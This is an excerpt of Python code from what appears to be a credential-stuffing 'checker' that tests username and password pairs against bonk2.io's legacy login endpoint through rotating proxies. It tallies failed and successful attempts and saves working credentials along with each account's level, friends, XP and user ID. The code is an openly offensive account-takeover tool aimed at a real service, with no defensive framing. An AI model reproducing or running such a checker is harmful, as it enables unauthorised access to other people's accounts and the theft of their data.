    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                response = s.post(
                    "https://bonk2.io/scripts/login_legacy.php", data=payload
                ).json()

            if response["r"] == "fail":
                if (
                    response.get("e") == "password"
                    or response.get("e") == "username_fail"
                ):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                ...
                if not Checker.cui:
                    log("good", ":".join([username, password]), "Bonk.io")
                save(
                    "BonkIO",
                    "good",
                    Checker.time,
                    ":".join([username, password])
                    + f" | Level: {level} | Friends: {friends} | Xp: {xp} | UserID: {user_id}",
                )
                Checker.good += 1
                return_proxy(proxy)
                return
